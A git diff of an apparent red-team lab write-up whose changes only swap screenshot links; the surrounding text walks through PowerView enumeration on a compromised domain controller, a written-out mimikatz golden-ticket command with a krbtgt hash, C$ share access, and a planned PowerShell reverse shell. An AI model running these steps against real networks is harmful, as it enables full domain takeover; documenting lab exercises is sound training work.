@@ -476,8 +476,8 @@ There is something missing in my enumeration approach. I forgot to use the power
 
 Sending the copy of PowerView-Dev.ps1 to the compromised Domain Controller.
 
-![Screenshot 2023-07-08 at 9 33 14 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/cd63f4c3-8882-455b-bcfb-2f655d57398c)
-![Screenshot 2023-07-08 at 9 33 02 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/af5137c3-7eb1-472b-b9d3-08810777ec3d)
+![Screenshot 2023-07-08 at 9 33 14 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/dfe0dde7-deed-45ec-8958-103ddf551747)
+![Screenshot 2023-07-08 at 9 33 02 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/09f3b556-0b8c-4875-9be3-d1090f5f18d1)
 
 Initiating the powershell and do the bypass
 
@@ -488,7 +488,7 @@ Get-Netcomputer | Select-Object cn
 
 Found 4 machines connected to the domain controller.
 
-![Screenshot 2023-07-08 at 9 40 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aaee5b8e-c061-4db2-9818-0b698f015f82)
+![Screenshot 2023-07-08 at 9 40 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/075b6457-8b9a-43b6-9e4c-d8aeb7b98f54)
 
 Back to mimikatz again. Using the SID of the child-admin and NTLM of the krbtgt, I will be forging my golden ticket to be able to access the domain controller fully.
 
@@ -497,7 +497,7 @@ Back to mimikatz again. Using the SID of the child-admin and NTLM of the krbtgt,
 ```bash
 kerberos::golden /User:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
-![Screenshot 2023-07-09 at 11 15 33 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/388f0904-3ee2-4b27-817c-e7c8b4393566)
+![Screenshot 2023-07-09 at 11 15 33 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/dd2d642c-9953-4aca-a2a2-a9ecc85c6e33)
 
 Exiting from mimikatz, from here we know that our golden ticket is temporarily saved in the machine’s memory.
 
@@ -509,7 +509,7 @@ PS > dir \\RED-CHILDDC.child.redteam.corp\c$
 
 Great, this is the one I missed - “\\RED_CHILDDC.child.redteam.corp”
 
-![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/d8004b97-4217-4e4b-907e-fc859b9335f6)
+![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/69d2ccdf-7688-4a72-bf42-c3e32d0d80f6)
 
 Now we are creating a powershell TCP that would connect back to our attacking machine on port 4444.
 
